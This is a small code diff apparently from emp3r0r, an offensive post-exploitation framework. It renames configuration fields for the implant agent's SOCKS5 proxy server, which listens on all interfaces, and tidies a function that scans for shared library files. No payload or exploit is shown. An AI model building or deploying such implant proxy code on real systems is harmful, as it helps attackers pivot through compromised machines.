@@ -57,13 +57,13 @@ func ApplyRuntimeConfig() (err error) {
 	log.Printf("Agent root: %s", RuntimeConfig.AgentRoot)
 
 	// Socks5 proxy server
-	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.Emp3r0rProxyServerPort)
+	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AgentSocksServerPort)
 	emp3r0r_def.ProxyServer, err = socks5.NewClassicServer(
 		addr, "", // listen on emp3r0r_proxy_port
 		RuntimeConfig.ShadowsocksLocalSocksPort, // used as socks5 username
 		RuntimeConfig.Password,                  // socks5 password
-		RuntimeConfig.AutoProxyTimeout,
-		RuntimeConfig.AutoProxyTimeout)
+		RuntimeConfig.AgentSocksTimeout,
+		RuntimeConfig.AgentSocksTimeout)
 	return
 }
 
@@ -176,7 +176,6 @@ func NameTheLibrary() string {
 		}
 		return nil
 	})
-
 	if err != nil {
 		log.Println("Error scanning for .so files:", err)
 		return ""
